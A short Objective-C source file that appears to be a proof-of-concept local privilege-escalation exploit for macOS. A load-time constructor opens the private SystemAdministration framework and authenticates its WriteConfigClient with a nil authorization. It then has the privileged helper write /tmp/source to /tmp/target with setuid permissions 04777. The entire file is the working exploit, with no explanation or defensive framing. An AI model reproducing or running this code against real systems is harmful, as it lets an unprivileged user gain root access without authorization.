#include <dlfcn.h>
#include <objc/objc.h>
#include <objc/runtime.h>
#include <objc/message.h>

#include <Foundation/Foundation.h>

#define PRIV_FWK_BASE "/System/Library/PrivateFrameworks"
#define FWK_BASE "/System/Library/Frameworks"

void __attribute__ ((constructor)) test(void)
{
	void *p = dlopen(PRIV_FWK_BASE "/SystemAdministration.framework/SystemAdministration", RTLD_NOW);
	
	if (p != NULL)
	{
		id sharedClient = objc_msgSend(objc_lookUpClass("WriteConfigClient"), @selector(sharedClient));
		
		objc_msgSend(sharedClient, @selector(authenticateUsingAuthorizationSync:), nil);
		
		id tool = objc_msgSend(sharedClient, @selector(remoteProxy));
		
		NSData *data = [NSData dataWithContentsOfFile:@"/tmp/source"];
		
		objc_msgSend(tool, @selector(createFileWithContents:path:attributes:), data, @"/tmp/target", @{ NSFilePosixPermissions: @04777 });
	}
}
